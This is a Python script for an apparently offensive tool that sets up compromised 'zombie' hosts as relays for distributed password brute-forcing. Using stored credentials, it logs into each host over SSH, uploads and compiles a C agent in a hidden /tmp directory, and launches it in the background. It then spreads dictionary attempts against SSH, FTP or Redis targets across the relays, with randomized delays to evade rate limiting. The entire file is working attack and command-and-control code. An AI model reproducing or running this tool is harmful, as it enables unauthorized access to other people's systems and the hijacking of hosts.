#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import optparse
import time
import random
import paramiko
import hashlib
import os
import sys
from threading import*
from socket import *

conn_no = 5
conn_lock = Semaphore(value=conn_no)
Found = False
Fails = 0
waitime = 5

#client_informations
# host = zmb_host
zombie_port = 43134
BUFSIZE = 4096
zombie_code = "zombie.c"
elf_name="ants_agent"
remote_path = "/tmp/."+hashlib.md5(str(time.time()).encode("utf8")).hexdigest()+"/"

def get_zombies(zombie_file):
    zombie_list = []
    fp = open(zombie_file,'r')
    
    for line in fp.readlines():
        zombie_list.append(line.strip('\r').strip('\n'))
    return zombie_list

def zombie_scp(s,local_file,remote_path):
    sftp = paramiko.SFTPClient.from_transport(s.get_transport())
    sftp = s.open_sftp()
    sftp.put(local_file, remote_path)

def awaken_zombies(zombie_list):
    local_file = zombie_code
    count = 0
    while count < len(zombie_list):
        try:
            zombie_info = zombie_list[count]
            zmb_host = zombie_info.split(':',2)[0]
            zmb_user = zombie_info.split(':',2)[1]
            zmb_pwd = zombie_info.split(':',2)[2]
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(zmb_host, 22, zmb_user, zmb_pwd)
            # clean
            ssh.exec_command("a=($(ls -a /tmp|grep '\.'|awk '{if(length($0)==33) {print $0}}')) && \
                for i in \"${a[@]}\";do rm -rf /tmp/\"$i\";done; mkdir -p " + remote_path)
            ssh.exec_command("a=($(netstat -ntlp|grep %s|awk '{print $7}'|awk -F/ '{print $1}')) && \
                for i in \"${a[@]}\";do kill -9 \"$i\";done" %zombie_port)
            # mv
            time.sleep(1) # wait commands above execute done, otherwise may occure socket error: '[Errno 2] No such file'.
            zombie_scp(ssh, local_file, remote_path + local_file)
            # compile, 为啥要nohup并重定向，因为实际测试中发现如果不加，随着扫描的进行，被控端上的进程会挂掉。
            ssh.exec_command("cd %s; gcc %s -lpthread -lssh -o %s ; chmod +x %s; nohup ./%s >nohup.log 2>&1 &" %(remote_path, zombie_code, elf_name, elf_name, elf_name) )
            # run
            stdin, stdout, stderr = ssh.exec_command("/usr/bin/ss -l|grep %d|echo \"anything ok!\"" %zombie_port)
            result=stdout.read().decode()
            #debug  print(result,stderr.read().decode())
            if "anything ok!" not in result:
                print ("...Zombie-host(%s)\t:\033[1;31m%s\033[0m...%s." %(zmb_host,"unavailable","Failed to start C2agent"))
                del(zombie_list[count])
                continue
            print ("...Zombie-host(%s)\t:\033[1;32m%s\033[0m" %(zmb_host,"available"))
            count+=1
        except Exception as e:
            print ("...Zombie-host(%s)\t:\033[1;31m%s\033[0m...%s" %(zmb_host,"unavailable",e))
            del(zombie_list[count])
            pass
    if zombie_list:
        #print zombie_list
        return zombie_list
    else:
        print ("\033[1;31m[Err]\033[0m None zombie-host available.\n")
        exit(1)
        
def conduct_zombie(target_link, user, password, zombie, release):
    global Found
    global waitime
    zmb_host = zombie.split(':',2)[0]
    zmb_user = zombie.split(':',2)[1]
    zmb_pwd = zombie.split(':',2)[2]
    try:
        if Found == True:
            exit(0)
        payload="%s/user=%s&passwd=%d:`*%s*`"  %(target_link, user, len(password), password)
        # print ("[!]Trying payload: %s" %(payload))
        sock = socket(AF_INET,SOCK_STREAM)
        sock.connect((zmb_host, zombie_port))
        sock.send(payload.encode())
        result=sock.recv(1024).decode()
        sock.close()
        if "{success:" in result:
            Found = True
            print ("\n[+] Congratulations. The password is: \033[1;32m%s\033[0m" % password)
            conn_lock.release()
            exit(0)
        else :
            if Found == True:
                exit(0)
            # print (result)
        
    except Exception as e:
        print ("\n\033[1;33m[Wrn]\033[0m Zombie-host(%s) connection failed! %s" %(zmb_host,str(e)))
        sock.close()
        pass
    finally:
        time.sleep(random.uniform(waitime, waitime * 2))
        conn_lock.release()
    
def check_target_info(options, parser):
    if options.target_link==None and (options.service_type==None or options.target_host==None or options.target_port==None):
        print ("\033[1;31m[Err]\033[0m Target information incorrect! Check & run again.")
        print (parser.usage)
        exit(1)
    if options.target_link==None: 
        target_link = options.service_type+"://"+options.target_host+":"+options.target_port
    else:
        if len(options.target_link.split(':',2)) != 3:
            print (parser.usage)
            exit(1)
    target_link = options.target_link
    return target_link
def precheck_connect_policy(options, zombie_available):
    global waitime
    try:
        if(options.waitime):
            waitime = float(options.waitime)
        if(options.conn_num):
            conn_num = int(options.conn_num)
            print ("...threads-number=%d ; available-zombies=%d ; thread_dealy=(%d,%d)." %(conn_num,zombie_available,waitime,2*waitime))
            if zombie_available < conn_num :
                print ("\033[1;33m[Wrn]\033[0m Set threads-number=%d , due to resource limit.\n" %(zombie_available))
                conn_num = zombie_available
        print("\033[1;33m[Wrn]\033[0m Watch out! Too much connection request may reach the limit of service.\n")
    except Exception as e:
        print ("\033[1;31m[Err]\033[0m Check and run again."+str(e))
        exit(1)
    return conn_num,waitime
def main():
    global conn_lock

    parser = optparse.OptionParser('usage % prog [-S <srv_type> -H <target_host> -p <target_port>]|[-T <target_link>] \n\t-u <user> '\
                                   + '-P <password-list> -Z <zombie_file>  -t <threads> -c <interval>' )
    parser.add_option('-S', '--srv_type', dest = 'service_type', type = 'string' , default = 'ssh' , help = 'Support: ssh,ftp,redis.    @TODO telnet/rdp/smb/custom ')
    parser.add_option('-H', '--host', dest = 'target_host', type = 'string', help = 'Host IP of target.')
    parser.add_option('-p', '--port', dest = 'target_port', default = '22', help = 'Port to connect to on the target.')
    parser.add_option('-T', '--target', dest = 'target_link', type = 'string' , help = 'Provide target information. Format: ssh://10.1.1.1:22')
    parser.add_option('-u', '--username', dest = 'user', type = 'string', help = 'Provide username when connect to the target. ')
    parser.add_option('-P', '--passwdfile', dest = 'passwd_file', type = 'string', help = 'Dictionary of passwords.')
    parser.add_option('-Z', '--zombiefile', dest = 'zombie_file', type = 'string', help = 'Provide zombie\'s resource. Format: 192.168.0.1:root:toor.')
    parser.add_option('-t', '--threads', dest = 'conn_num', type = 'string', help = 'Run threads number of connects in parallel. default 5.')
    parser.add_option('-c', '--interval', dest = 'waitime', type = 'string', help = 'Defines the minimum wait time in seconds, default 5s. '\
                      + 'ants use random time interval technology. The actual time interval is 5.0~10.0 seconds.')
    (options,args) = parser.parse_args()
    
#check target information
    target_link = check_target_info(options,parser)
    user = 'root'
    passwd_file = options.passwd_file
    if options.user:
        user = options.user
    else :
        print ("\033[1;33m[Wrn]\033[0m Target username is not specified, use `root`.")
    print ("[+] Target --> %s/?username=%s&passwdfile=%s\n"  %(target_link, user, passwd_file))
# check zombies
    zombie_file = options.zombie_file
    print ("[+] Check zombies......")
    zombie_list = get_zombies(zombie_file)
    zombie_total = len(zombie_list)
    zombie_list = awaken_zombies(zombie_list)
    #@todo check_zombies() 检查socket是否开起来了，awaken不能确保zombie的socket端口确实可用。实际使用时不太稳定。
    zombie_available = len(zombie_list)
    print ("> (%d/%d) zombies available.\n" %(zombie_available, zombie_total))
    
# check_policy
    print ("[+] Check bruteforce policy......")
    conn_num,_ = precheck_connect_policy(options, zombie_available)
    conn_lock = Semaphore(value=conn_num)
# fire on target!

    cmd_get_rows_num = "wc -l "+ passwd_file +" |awk '{print $1}' | sed -n '1p'"
    try:
        passwd_total = os.popen(cmd_get_rows_num).readlines()[0].strip()
    except IndexError:
        print ("\033[1;31m[Err]\033[0m Passwords file not exist.")
        exit(1)
    print ("[+] Fire in few seconds. Please wait......")
    time.sleep(2)
    fp = open(passwd_file,'r')
    count = 1
    for password in fp.readlines():
        if Found == True:
            print ("\rAbout %.2f%% done ... Already %d attempts." %(count*100/float(passwd_total),count))
            exit(0)
        if not count%1:
            print ("\rAbout %.2f%% done ... Already %d attempts." %(count*100/float(passwd_total),count) ,end='')
            sys.stdout.flush()
        count += 1
        zombie = zombie_list[count%zombie_available]
        password = password.strip('\r').strip('\n')
        
        conn_lock.acquire()
        print(zombie)
        t = Thread(target = conduct_zombie, args = (target_link, user, password, zombie, True))
        child = t.start()
    if Found == False:
        print ("\rAbout %.2f%% done ... Already %d attempts." %(count*100/float(passwd_total),count))
        print ("\033[1;33m[Wrn]\033[0m Found nothing.")

if __name__ == '__main__':
    main()
